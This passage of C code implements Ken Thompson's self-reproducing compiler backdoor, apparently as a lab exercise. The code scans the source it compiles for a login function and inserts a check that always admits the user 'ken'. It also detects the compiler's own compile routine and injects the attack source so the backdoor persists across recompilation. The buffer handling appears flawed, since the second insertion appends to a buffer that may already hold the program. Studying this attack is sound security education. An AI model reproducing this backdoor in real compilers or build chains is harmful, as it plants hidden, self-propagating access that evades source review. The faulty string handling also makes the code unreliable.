    fprintf(fp, "char prog[] = {\n");
    for (int i = 0; prog[i]; i++)
        fprintf(fp, "\t%d,\n", prog[i]);
    fprintf(fp, "0 };\n");

    char *hacked_prog = 0;
    unsigned hacked_prog_len = strlen(program) + 1;

    static char login_sig[] = "int login(char *user) {";
    static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
    char *login_start = strstr(program, login_sig);
    if (login_start) {
        hacked_prog_len += strlen(login_attack);
        hacked_prog = calloc(hacked_prog_len, sizeof(char));

        // insert prefix
        char *login_end = login_start + strlen(login_sig);
        strncat(hacked_prog, program, login_end - program);

        // insert attack
        strcat(hacked_prog, login_attack); 

        // insert suffix
        strcat(hacked_prog, login_end);
        
        program = hacked_prog;
    }

    static char compile_sig[] = 
            "static void compile(char *program, char *outname) {\n"
            "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
            "    assert(fp);"
            ;
    char *compile_start = strstr(program, compile_sig);
    if (compile_start) {
        hacked_prog_len += strlen(prog);
        hacked_prog = realloc(hacked_prog, hacked_prog_len);

        // insert prefix
        char *compile_end = compile_start + strlen(compile_sig);
        strncat(hacked_prog, program, compile_end - program);

        // insert attack
        strcat(hacked_prog, prog);

        // insert suffix
        strcat(hacked_prog, compile_end);

        program = hacked_prog;
    }
